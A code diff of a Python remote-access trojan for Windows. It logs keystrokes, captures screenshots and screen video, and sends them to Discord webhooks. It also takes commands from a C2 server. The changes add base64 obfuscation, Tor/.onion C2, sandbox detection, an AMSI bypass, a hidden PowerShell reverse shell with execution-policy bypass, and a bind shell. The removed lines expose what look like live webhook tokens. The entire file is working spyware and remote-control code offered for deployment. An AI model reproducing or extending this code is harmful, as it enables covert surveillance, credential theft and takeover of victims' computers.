@@ -5,7 +5,7 @@ import os
 import tempfile
 import requests
 import time
-#import pyaudio
+import pyaudio
 import wave
 from pynput import keyboard
 import schedule
@@ -13,18 +13,50 @@ import socket
 import subprocess
 import threading
 import sys
+import ssl
+import socks
+import base64
+import psutil          # pip install psutil
 
-# ==================== CONFIG ====================
-SCREEN_WEBHOOK_URL = "https://discord.com/api/webhooks/1252261362097192961/p0tzj_iJN8c-Iv3AdvPA-oNQBBwnzFnbRLAE5ibTCWvH93IMBxW3TarBbO1VNLAhMLTI"
-AUDIO_WEBHOOK_URL = "https://discord.com/api/webhooks/1259623619332411524/KdAhb0i7oTwfaFsHfhYfQJda5Cx7DgS5S7c27Fan_LAxN25A3KbPq3wqgaVY1vI_Eome"
-KEYLOGGER_WEBHOOK_URL = 'https://discord.com/api/webhooks/1246901796782473329/rcIggVdzfYRUJVYMjJgZcRrc3Z8fWjEWEm83dmxB48kpM1erU04lp7GBX4CSlqy9rn5x'
-SCREENSHOT_WEBHOOK_URL = 'https://discord.com/api/webhooks/1244445585373794325/ZIlEfyS5C1HBedpugnAq_lOxgi538WzXQFszdga4SbPRzbILEfivhECVTNNRS2NCC6-5'
+# ==================== CONFIG (Base64 obfuscated) ====================
+def b64(s):
+    return base64.b64decode(s).decode()
 
-C2_IP  = "192.168.122.23"   # your server IP
-C2_PORT = 4444
+ONION_ADDRESS = b64("eW91cl9vbmlvbl9hZGRyZXNzLm9uaW9u")  # Replace with your .onion
+C2_PORT = 4443
+TOR_PROXY = ('127.0.0.1', 9050)
+
+# Discord webhooks – replace these with your own (base64 encoded)
+SCREEN_WEBHOOK_URL   = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")
+AUDIO_WEBHOOK_URL    = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")  # not used
+KEYLOGGER_WEBHOOK_URL = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")
+SCREENSHOT_WEBHOOK_URL = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")
 
 KEYLOG_PATH = "C:\\Users\\Public\\Documents\\keyhits.txt"
 recording_active = True
+
+# ==================== ANTI-SANDBOX ====================
+def is_sandbox():
+    """Return True if likely in a sandbox environment."""
+    try:
+        # Uptime less than 30 minutes
+        if time.time() - psutil.boot_time() < 1800:
+            return True
+        # Less than 2 CPU cores
+        if psutil.cpu_count() < 2:
+            return True
+        # Total disk space < 60 GB
+        disk = psutil.disk_usage('/')
+        if disk.total < 60 * 1024**3:
+            return True
+    except:
+        pass
+    return False
+
+if is_sandbox():
+    print("Sandbox detected – sleeping for 30 seconds...")
+    time.sleep(30)
+    # Optionally exit: sys.exit(0)
 
 # ==================== CORE FUNCTIONS ====================
 def send_to_discord(file_path, webhook_url):
@@ -44,7 +76,6 @@ def record_screen(output_path, record_time=30, fps=8):
             out.write(frame)
         out.release()
 
-# Audio recording – kept but commented out in main loop
 def record_audio(output_path, record_time=30, channels=1, rate=16000, chunk=1024):
     audio = pyaudio.PyAudio()
     stream = audio.open(format=pyaudio.paInt16, channels=channels,
@@ -112,67 +143,105 @@ def scheduled_screenshots():
     send_screenshot_to_discord(os.path.join(ensure_ss_folder_exists(), 'screenshot.png'),
                                SCREENSHOT_WEBHOOK_URL)
 
-# ==================== STEALTH C2 SHELL (NO COMMAND-LINE SCRIPT) ====================
-def interactive_shell(sock):
-    """Spawn a hidden PowerShell, feed script via stdin – no base64, no encoded command."""
-    try:
-        # The PowerShell script is fed through stdin – never appears on command line.
-        ps_script = '''
-$ErrorActionPreference = "Stop"
-while ($true) {
-    $cmd = Read-Host
-    if ($cmd -eq "exit") { break }
-    try {
-        $output = Invoke-Expression $cmd 2>&1 | Out-String
-        if ($output -eq "") { $output = "Command executed successfully." }
-    } catch {
-        $output = $_.Exception.Message
-    }
-    Write-Output $output
-}
-'''
-        creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
-        p = subprocess.Popen(
-            ['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden'],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            creationflags=creationflags
-        )
+# ==================== STEALTH SHELL (AMSI BYPASS + STDIN) ====================
+def spawn_powershell_shell(sock):
+    """
+    Spawns a hidden PowerShell process with AMSI bypass.
+    The script is fed via stdin – no command-line arguments.
+    """
+    ps_script = (
+        '$amsi = [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\');'
+        '$field = $amsi.GetField(\'amsiInitFailed\',\'NonPublic,Static\');'
+        '$field.SetValue($null,$true);'
+        'function main { '
+        '    $ErrorActionPreference = "Stop"; '
+        '    while ($true) { '
+        '        $cmd = Read-Host; '
+        '        if ($cmd -eq "exit") { break }; '
+        '        try { '
+        '            $output = Invoke-Expression $cmd 2>&1 | Out-String; '
+        '            if ($output -eq "") { $output = "Command executed successfully." } '
+        '        } catch { '
+        '            $output = $_.Exception.Message '
+        '        }; '
+        '        Write-Output $output '
+        '    } '
+        '}; main'
+    )
+    creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
+    p = subprocess.Popen(
+        ['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass'],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        creationflags=creationflags
+    )
+    p.stdin.write((ps_script + "\n").encode())
+    p.stdin.flush()
+    time.sleep(0.5)
 
-        # Feed the script to PowerShell's stdin
-        p.stdin.write(ps_script.encode())
-        p.stdin.flush()
-
-        # Thread to read PowerShell output and send to socket
-        def read_output():
-            while True:
-                out = p.stdout.read(4096)
-                if not out:
-                    break
-                sock.send(out)
-
-        threading.Thread(target=read_output, daemon=True).start()
-
-        # Relay commands from socket to PowerShell stdin
+    def read_output():
         while True:
-            data = sock.recv(4096)
-            if not data:
+            out = p.stdout.read(4096)
+            if not out:
                 break
-            p.stdin.write(data)   # data already includes newline from server
-            p.stdin.flush()
+            sock.send(out)
+    threading.Thread(target=read_output, daemon=True).start()
 
-        p.terminate()
+    while True:
+        data = sock.recv(4096)
+        if not data:
+            break
+        p.stdin.write(data)
+        p.stdin.flush()
+    p.terminate()
+
+def interactive_shell(sock):
+    try:
+        spawn_powershell_shell(sock)
     except Exception as e:
         sock.send(f"Shell error: {e}\n".encode())
+
+# ==================== BIND SHELL ====================
+def bind_shell(port):
+    """Start a TCP listener and spawn a hidden PowerShell on connection."""
+    try:
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind(('0.0.0.0', int(port)))
+        server.listen(1)
+        print(f"[*] Bind shell listening on port {port}")
+        client, addr = server.accept()
+        print(f"[+] Incoming connection from {addr[0]}:{addr[1]}")
+        spawn_powershell_shell(client)
+        client.close()
+        server.close()
+    except Exception as e:
+        print(f"Bind shell error: {e}")
+
+# ==================== C2 CONNECTION VIA TOR ====================
+def connect_to_c2():
+    """Connect to .onion server via Tor SOCKS proxy, with optional TLS."""
+    s = socks.socksocket()
+    s.set_proxy(socks.SOCKS5, *TOR_PROXY)
+    s.connect((ONION_ADDRESS, C2_PORT))
+    # Attempt TLS wrap (if server uses it)
+    try:
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        tls_sock = context.wrap_socket(s, server_hostname=ONION_ADDRESS)
+        return tls_sock
+    except:
+        # Fallback to plain socket if TLS fails
+        return s
 
 def c2_handler():
     global recording_active
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((C2_IP, C2_PORT))
-            s.send(b"[+] Connected to C2 server\n")
+            s = connect_to_c2()
+            s.send(b"[+] Connected to C2 server via Tor\n")
             print("[C2] Connected.")
 
             while True:
@@ -186,18 +255,25 @@ def c2_handler():
                 elif cmd == "stop":
                     recording_active = False
                     s.send(b"[+] Recording stopped\n")
+                elif cmd.startswith("bind "):
+                    try:
+                        port = cmd.split()[1]
+                        s.send(b"[+] Starting bind shell on port " + port.encode() + b"\n")
+                        threading.Thread(target=bind_shell, args=(port,), daemon=True).start()
+                    except Exception as e:
+                        s.send(f"Bind error: {e}\n".encode())
                 elif cmd == "shell":
-                    s.send(b"[+] Spawning shell...\n")
+                    s.send(b"[+] Spawning reverse shell...\n")
                     interactive_shell(s)
                     s.send(b"[+] Shell closed\n")
                 elif cmd == "exit":
                     s.send(b"[+] Exiting\n")
                     os._exit(0)
                 else:
-                    s.send(b"Unknown command. Available: start, stop, shell, exit\n")
+                    s.send(b"Unknown command. Available: start, stop, bind <port>, shell, exit\n")
         except Exception as e:
-            print(f"[C2] Error: {e}. Reconnecting in 5s...")
-            time.sleep(5)
+            print(f"[C2] Error: {e}. Reconnecting in 10s...")
+            time.sleep(10)
         finally:
             try:
                 s.close()
@@ -206,14 +282,18 @@ def c2_handler():
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
+    # Ensure keylog file exists
     if not os.path.exists(KEYLOG_PATH):
         open(KEYLOG_PATH, 'a').close()
 
+    # Start keylogger listener
     keyboard.Listener(on_press=key_press, on_release=key_release).start()
 
+    # Start C2 thread
     threading.Thread(target=c2_handler, daemon=True).start()
     print("[C2] Thread started.")
 
+    # Schedule background tasks
     schedule.every(1).minute.do(send_keylog_to_discord)
     schedule.every(30).seconds.do(scheduled_screenshots)
 
@@ -235,7 +315,7 @@ if __name__ == "__main__":
                 print(f"Screen error: {e}")
                 time.sleep(5)
 
-            # Audio recording (commented out)
+            # Audio recording (commented out – uncomment if needed)
             # try:
             #     path = os.path.join(temp_dir, f"voice_record_{clip_number}.wav")
             #     record_audio(path, record_time=30)
@@ -249,4 +329,3 @@ if __name__ == "__main__":
             #     time.sleep(5)
 
         time.sleep(1)
-
